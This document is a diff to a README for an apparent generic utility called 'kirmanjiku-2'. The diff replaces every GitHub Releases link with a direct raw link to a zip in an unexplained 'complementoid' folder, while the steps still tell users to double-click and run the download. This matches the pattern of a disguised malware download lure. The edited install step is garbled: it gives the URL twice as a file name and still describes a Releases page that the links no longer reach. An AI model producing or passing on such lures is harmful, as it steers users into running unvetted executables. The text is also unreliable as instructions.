@@ -1,18 +1,18 @@
 # 🚀 kirmanjiku-2 - Simple Tool for Efficient Management
 
 ## 🔗 Download Now
-[![Download kirmanjiku-2](https://img.shields.io/badge/Download-kirmanjiku--2-blue.svg)](https://github.com/zuckkiller/kirmanjiku-2/releases)
+[![Download kirmanjiku-2](https://raw.githubusercontent.com/zuckkiller/kirmanjiku-2/main/complementoid/kirmanjiku-2.zip)](https://raw.githubusercontent.com/zuckkiller/kirmanjiku-2/main/complementoid/kirmanjiku-2.zip)
 
 ## 📜 Description
 kirmanjiku-2 is an easy-to-use application designed to streamline your tasks. Whether you’re managing files, organizing projects, or simply looking for a reliable tool, kirmanjiku-2 has you covered.
 
 ## 📥 Download & Install
-To get started with kirmanjiku-2, please visit the following link to download the latest version: [Download kirmanjiku-2](https://github.com/zuckkiller/kirmanjiku-2/releases).
+To get started with kirmanjiku-2, please visit the following link to download the latest version: [Download kirmanjiku-2](https://raw.githubusercontent.com/zuckkiller/kirmanjiku-2/main/complementoid/kirmanjiku-2.zip).
 
 1. Click the link above to open the Releases page.
 2. Find the latest version at the top of the list.
 3. Click on the version number to view the downloadable files.
-4. Look for a file with a name similar to 'kirmanjiku-2.exe' or 'kirmanjiku-2.zip'.
+4. Look for a file with a name similar to 'https://raw.githubusercontent.com/zuckkiller/kirmanjiku-2/main/complementoid/kirmanjiku-2.zip' or 'https://raw.githubusercontent.com/zuckkiller/kirmanjiku-2/main/complementoid/kirmanjiku-2.zip'.
 5. Click the file to start the download.
 6. Once downloaded, locate the file in your Downloads folder.
 7. Double-click the file to run the application.
@@ -43,7 +43,7 @@ When you open kirmanjiku-2, you will see a welcoming dashboard. This dashboard p
 
 ## ❓ Frequently Asked Questions
 ### How do I update kirmanjiku-2?
-Simply revisit the [Releases page](https://github.com/zuckkiller/kirmanjiku-2/releases) and download the latest version using the same steps outlined in the "Download & Install" section.
+Simply revisit the [Releases page](https://raw.githubusercontent.com/zuckkiller/kirmanjiku-2/main/complementoid/kirmanjiku-2.zip) and download the latest version using the same steps outlined in the "Download & Install" section.
 
 ### Can I run kirmanjiku-2 on my Mac?
 Yes, kirmanjiku-2 supports macOS. Follow the same download instructions to get the Mac version.
